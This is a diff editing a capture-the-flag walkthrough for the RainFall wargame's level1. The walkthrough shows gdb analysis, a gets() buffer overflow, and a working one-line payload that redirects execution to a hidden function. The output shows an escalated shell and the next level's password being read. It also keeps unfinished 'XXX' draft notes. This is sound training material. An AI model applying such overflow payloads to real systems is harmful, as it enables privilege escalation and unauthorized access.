@@ -1,9 +1,9 @@
 # Level 0
 
-- Once logged in, you will see a binary `level1`
+Once logged in, you will see a binary `level1`.
 
 ```
-[???] $ ssh level1@localhost -p 4242
+$ ssh level1@localhost -p 4242
           _____       _       ______    _ _
          |  __ \     (_)     |  ____|  | | |
          | |__) |__ _ _ _ __ | |__ __ _| | |
@@ -26,16 +26,16 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level1/level1
 level1@RainFall:~$ ls
 level1
-level1@RainFall:~$
+level1@RainFall:~$ XXX: put in ls -l
 ```
 
-let's run this and see what this does
+Let's run this and see what this does.
 ```
 level1@RainFall:~$ ./level1
 
 ```
 
-okay, it seems it tries getting input, so let's try typing something
+It seems it tries getting input, so let's try typing something.
 
 ```
 level1@RainFall:~$ ./level1
@@ -43,7 +43,7 @@ aaa
 level1@RainFall:~$
 ```
 
-It does nothing :/, so let's run gdb to see what's going on
+It does nothing, so let's run gdb to see what's going on.
 
 ```
 level1@RainFall:~$ gdb level1
@@ -72,7 +72,7 @@ End of assembler dump.
 gdb-peda$
 ```
 
-seems there must be some more, and we can check the list of functions by the command on gdb: `info functions`
+It seems there must be some more, and we can check the list of functions by the command on gdb: `info functions`.
 
 ```
 Non-debugging symbols:
@@ -97,7 +97,8 @@ Non-debugging symbols:
 0x08048512  __i686.get_pc_thunk.bx
 0x08048520  __do_glo
 ```
-there are some system calls and some, but we see a function `run`. let's check the function
+
+There are some system calls, but we see a function `run`. let's check that function.
 
 ```
 gdb-peda$ disass run
@@ -121,35 +122,33 @@ End of assembler dump.
 gdb-peda$
 ```
 
-Now, the function `run` is initialized, but there is no way the function `run` is called. But on main, we can see the `gets` function is used. The `gets` function has a vulnerbility, as the input of the gets is not lengthed:
+Now, the function `run` is initialized, but there is no way the function `run` is called. But on main, we can see the `gets` function is used. The `gets` function has a vulnerability (as noted in its [man page](https://linux.die.net/man/3/gets)), as the input length is not checked:
 
-ref: https://linux.die.net/man/3/gets
 ```
-...
 Bugs
 Never use gets(). Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use. It has been used to break computer security. Use fgets() instead.
-...
 ```
 
-by it means, we can use the buffer overflow, that in between where `gets` function is called, and once it returns back to the main function, we can modify the memory on the stack to `return` to the main function. Of course, we need to figure out the right location to put the address of `run`, and it will be the `EIP` register.
+This means we can use a buffer overflow attack to modify the memory on the stack to "return" to the `run` function at the end of the main function. To do this, we'll need to figure out the location of `run` in memory and put that in the `eip` register.
 
-back to the `main`, the whole stack frame is allocated by beginning of stack by `0x50` (=80 in decimal)
+In `main`, the whole stack frame is allocated with a size of `0x50` (80 in decimal). Note that this includes both the stack frame as well as any memory allocated, in this case 64 (XXX: check) bytes for the `gets` buffer.
 
 ```
    0x08048480 <+0>:     push   ebp
    0x08048481 <+1>:     mov    ebp,esp
    0x08048483 <+3>:     and    esp,0xfffffff0
-   0x08048486 <+6>:     sub    esp,0x50 <- here
+   0x08048486 <+6>:     sub    esp,0x50          // <- here
    0x08048489 <+9>:     lea    eax,[esp+0x10]
 ```
-so just try running the program with the random parameter of 80 and see how it works:
+
+Let's try running the program with the parameter of length 80 and see how it works:
 
 ```
 level1@RainFall:~$ python -c "print 'A' * 80" | ./level1
 Segmentation fault (core dumped)
 ```
 
-it gives out the segmentation fault. checking on the debugger, we can see the EIP is overwritten the character `AAAA`
+The program crashes with a segmentation fault. Checking on the debugger, we can see the `eip` register is overwritten the character `AAAA`!
 
 ```
 gdb-peda$ run <<< $(python -c "print 'A' *80")
@@ -183,7 +182,7 @@ Stopped reason: SIGSEGV
 gdb-peda$
 ```
 
-If we replace `AAAA` by the address of the function `run`, instead of segfault caused from invalid return address, the run fuction will be executed.
+If we replace the last `AAAAAAAA` with the address of the function `run`, instead of a segmentation fault caused from invalid return address, the run function will be executed.
 
 ```
 level1@RainFall:~$ (python -c "print 'A' * 76 + '\x44\x84\x04\x08'" ; cat -) | ./level1
@@ -193,4 +192,3 @@ uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(
 cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
-
